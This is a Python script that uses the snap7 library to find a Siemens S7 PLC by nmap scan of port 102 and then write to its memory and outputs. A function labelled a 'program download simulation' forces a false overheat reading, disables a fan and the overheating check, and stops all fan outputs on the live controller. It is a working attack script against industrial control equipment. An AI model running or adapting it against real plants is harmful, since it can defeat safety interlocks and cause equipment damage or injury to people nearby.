import snap7
import struct
import subprocess
import re

# --- Configuration ---
PLC_IP = None  # Initially set to None, to be discovered
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER_FC1 = 1 # Block FC1 is implied, but define its DB Number anyway.  Could be irrelevant for direct tag access.
DB_NUMBER_FC2 = 2 # Block FC2 is implied, but define its DB Number anyway.  Could be irrelevant for direct tag access.

# --- Helper Functions ---

def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.  Requires nmap to be installed.
    """
    try:
        # Run nmap to scan for Siemens S7 devices (port 102)
        result = subprocess.run(['nmap', '-p', '102', '192.168.1.0/24'], capture_output=True, text=True) # replace 192.168.1.0/24 with your network range.  Crucial security point!

        # Parse the nmap output for IP addresses with port 102 open
        ip_addresses = []
        for line in result.stdout.splitlines():
            if "102/tcp open" in line:
                match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    ip_addresses.append(match.group(1))

        if ip_addresses:
            print(f"Found potential PLC IP addresses: {ip_addresses}")  # print potential IP addresses
            return ip_addresses[0]  # return the first one found
        else:
            print("No PLC found on the network.  Check network configuration and nmap installation.")
            return None

    except FileNotFoundError:
        print("Nmap is not installed.  Please install nmap to use automatic IP discovery.")
        return None
    except Exception as e:
        print(f"An error occurred during IP discovery: {e}")
        return None



def read_plc_tag(plc, tag_address, data_type):
    """
    Reads a single tag from the PLC.

    Args:
        plc: The snap7 PLC client object.
        tag_address (str):  The tag address in the format "%M0.0", "%Q0.1", "%MW7", etc.
        data_type (str):  The data type of the tag, e.g., "Bool", "Int", "Real", "Byte".

    Returns:
        The value of the tag, or None if an error occurred.
    """

    area = None
    db_number = None
    byte_offset = None
    bit_offset = 0  # Default to 0 for non-boolean types

    try:
        # Parse the tag address
        area_code = tag_address[1]
        address_parts = tag_address[2:].split('.') #splits the address based on "."

        if area_code == 'M':
            area = snap7.client. Areas.MK
        elif area_code == 'Q':
            area = snap7.client. Areas.PA  # Output area
        elif area_code == 'I':
            area = snap7.client.Areas.PE # Input Area
        elif area_code == 'D':
            area = snap7.client.Areas.DB
            db_number = int(address_parts[0])
            address_parts = address_parts[1:] # Update address_parts after DB number
        else:
            print(f"Error: Invalid area code in tag address: {tag_address}")
            return None

        # Get byte and bit offset
        if len(address_parts) == 1:
            byte_offset = int(address_parts[0])
        elif len(address_parts) == 2:
            byte_offset = int(address_parts[0])
            bit_offset = int(address_parts[1])
        else:
            print(f"Error: Invalid tag address format: {tag_address}")
            return None

        # Read the data based on the data type
        if data_type == "Bool":
            result = plc.read_area(area, db_number or 0, byte_offset, 1)
            value = snap7.util.get_bool(result, 0, bit_offset)
            return value
        elif data_type == "Byte":
            result = plc.read_area(area, db_number or 0, byte_offset, 1)
            return result[0] # Return the byte value
        elif data_type == "Int":
            result = plc.read_area(area, db_number or 0, byte_offset, 2)
            value = struct.unpack(">h", result)[0]  # '>h' for big-endian short (2 bytes)
            return value
        else:
            print(f"Error: Unsupported data type: {data_type}")
            return None

    except Exception as e:
        print(f"Error reading tag {tag_address}: {e}")
        return None


def write_plc_tag(plc, tag_address, data_type, value):
    """
    Writes a single tag to the PLC.

    Args:
        plc: The snap7 PLC client object.
        tag_address (str): The tag address in the format "%M0.0", "%Q0.1", "%MW7", etc.
        data_type (str): The data type of the tag, e.g., "Bool", "Int", "Real", "Byte".
        value: The value to write to the tag.  Must be the correct data type.
    """

    area = None
    db_number = None
    byte_offset = None
    bit_offset = 0

    try:
        # Parse the tag address (same as read_plc_tag)
        area_code = tag_address[1]
        address_parts = tag_address[2:].split('.')

        if area_code == 'M':
            area = snap7.client.Areas.MK
        elif area_code == 'Q':
            area = snap7.client.Areas.PA  # Output area
        elif area_code == 'I':
            area = snap7.client.Areas.PE  # Input area
        elif area_code == 'D':
            area = snap7.client.Areas.DB
            db_number = int(address_parts[0])
            address_parts = address_parts[1:]
        else:
            print(f"Error: Invalid area code in tag address: {tag_address}")
            return

        if len(address_parts) == 1:
            byte_offset = int(address_parts[0])
        elif len(address_parts) == 2:
            byte_offset = int(address_parts[0])
            bit_offset = int(address_parts[1])
        else:
            print(f"Error: Invalid tag address format: {tag_address}")
            return

        # Prepare the data to write
        if data_type == "Bool":
            buffer = bytearray(1)  # 1 byte is enough for a boolean
            snap7.util.set_bool(buffer, 0, bit_offset, value)  # Set the bit
            plc.write_area(area, db_number or 0, byte_offset, buffer)
        elif data_type == "Byte":
            buffer = bytearray([value]) # Value must be an integer
            plc.write_area(area, db_number or 0, byte_offset, buffer)
        elif data_type == "Int":
             # Pack the integer into a bytearray (big-endian, short)
            buffer = struct.pack(">h", value)  # '>h' for big-endian short (2 bytes)
            plc.write_area(area, db_number or 0, byte_offset, buffer)
        else:
            print(f"Error: Unsupported data type: {data_type}")
            return

        print(f"Successfully wrote {value} to {tag_address}")

    except Exception as e:
        print(f"Error writing to tag {tag_address}: {e}")



def program_download(plc):
    """
    Simulates a program download by modifying key variables.

    This is a simplified simulation and does not perform a full program download.
    It focuses on modifying key variables that could disrupt the process.
    """
    # Example 1:  Force a high temperature to trigger fan activation
    write_plc_tag(plc, "%MW7", "Int", 450) # Motor_Temp
    print("Simulating program download:  Forcing Motor_Temp to 450 to trigger overheating and fan activation.")

    # Example 2:  Disable Fan A by setting Activate_Fan_A to False
    write_plc_tag(plc, "%M0.0", "Bool", False) # Activate_Fan_A
    print("Simulating program download:  Disabling Fan A by setting Activate_Fan_A to False.")

    # Example 3:  Forcefully activate Master_Fan_B_HMI to potentially bypass safety checks
    write_plc_tag(plc, "%M0.5", "Bool", True) # Master_Fan_B_HMI
    print("Simulating program download:  Forcefully activating Master_Fan_B_HMI.")

    # Example 4:  Disable Overheating Check
    write_plc_tag(plc, "%M0.2", "Bool", False) # Overheating_Check
    print("Simulating program download: Disabling Overheating Check.")

    # Example 5: Modify timer values (Potentially disrupt timing sequences)
    # NOTE:  This requires knowing the exact memory location of timer preset values.
    # This example is illustrative. You'd need to determine the correct addresses.
    # This example assumes the Timer Preset Value is an Integer in Memory block 10 starting at byte 0.
    # In reality, you'd need to know the Data Block number where these timers are stored and their exact offset.
    # write_plc_tag(plc, "%DB10.DBW0", "Int", 1)  # Very short timer value.  Potentially causes issues.
    # print("Simulating program download:  Modifying timer value in DB10.DBW0 (WARNING: Address may be incorrect!)")

    # Example 6: Stop all the fans
    write_plc_tag(plc, "%Q0.0", "Bool", False)
    write_plc_tag(plc, "%Q0.1", "Bool", False)
    print("Simulating program download: Stopping all the fans.")

    print("Program download simulation complete.")

# --- Main ---
if __name__ == "__main__":

    # 1. Discover the PLC IP address
    PLC_IP = discover_plc_ip()

    if PLC_IP is None:
        print("PLC IP address not found.  Exiting.")
        exit()

    # 2. Connect to the PLC
    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # 3. Simulate Program Download
        program_download(plc)


    except Exception as e:
        print(f"Error communicating with the PLC: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")